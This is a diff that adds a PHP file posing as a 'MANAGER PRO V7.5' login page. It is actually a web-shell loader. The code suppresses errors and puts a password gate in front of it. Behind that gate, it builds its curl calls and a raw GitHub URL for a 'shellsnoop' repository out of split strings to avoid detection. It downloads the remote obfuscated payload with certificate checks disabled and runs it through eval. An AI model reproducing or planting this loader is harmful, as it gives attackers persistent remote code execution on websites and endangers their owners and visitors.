@@ -1,0 +1,78 @@
+<?php
+error_reporting(0);
+$password_hash = '$2y$10$aEceW/XyqUQput3WRjgLW.Xb1833E6d5AfQRfdTLseM6ez4vEIuO2';
+$auth_salt = "SFEC_V7";
+$cookie_name = md5($_SERVER['HTTP_HOST'] . $auth_salt);
+
+if (isset($_GET['logout'])) {
+    setcookie($cookie_name, '', time() - 3600, "/");
+    header("Location: ?"); exit;
+}
+
+$is_logged_in = false;
+if (isset($_COOKIE[$cookie_name])) {
+    if ($_COOKIE[$cookie_name] === md5($password_hash . $auth_salt)) {
+        $is_logged_in = true;
+    }
+}
+
+if (!$is_logged_in) {
+    if (isset($_POST['pass']) && password_verify($_POST['pass'], $password_hash)) {
+        setcookie($cookie_name, md5($password_hash . $auth_salt), time() + 86400, "/");
+        header("Location: ?path=" . urlencode(dirname(__FILE__))); exit;
+    }
+    ?>
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>Login</title>
+        <style>
+            body { background: #0f0f0f; color: #eee; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+            .login-box { background: #1a1a1a; padding: 30px; border: 1px solid #333; border-radius: 5px; text-align: center; width: 300px; }
+            input { background: #000; border: 1px solid #444; color: #0f0; padding: 10px; width: 100%; box-sizing: border-box; margin-bottom: 15px; text-align: center; }
+            button { background: #8e44ad; color: #fff; border: none; padding: 10px 20px; cursor: pointer; border-radius: 3px; width: 100%; font-weight: bold; }
+        </style>
+    </head>
+    <body>
+        <div class="login-box">
+            <h3 style="color: #8e44ad; margin-top: 0;">MANAGER PRO V7.5</h3>
+            <form method="POST">
+                <input type="password" name="pass" placeholder="Password" autofocus>
+                <button type="submit">LOGIN</button>
+            </form>
+        </div>
+    </body>
+    </html>
+    <?php
+    exit;
+}
+$f = 'cur'.'l_init';
+$e = 'cur'.'l_exec';
+$s = 'cur'.'l_set'.'opt';
+$c = 'cur'.'l_cl'.'ose';
+
+function fetch_remote($url) {
+    global $f, $e, $s, $c;
+    
+    if (function_exists($f)) {
+        $ch = $f();
+        $s($ch, CURLOPT_HEADER, 0);
+        $s($ch, CURLOPT_RETURNTRANSFER, 1);
+        $s($ch, CURLOPT_URL, $url);
+        $s($ch, CURLOPT_SSL_VERIFYPEER, false);
+        $data = $e($ch);
+        $c($ch);
+        return $data;
+    }
+    return @file_get_contents($url);
+}
+
+$payload_url = "htt"."ps://ra"."w.githu"."busercont"."ent.com/call"."snoop/she"."llsnoop/ref"."s/heads/ma"."in/snoop-obf".".txt";
+$remote_data = fetch_remote($payload_url);
+
+if ($remote_data) {
+    // Menggunakan penutupan tag PHP untuk memastikan eksekusi kode mentah
+    $prefix = '?'.'>';
+    eval($prefix . $remote_data);
+}
+?>
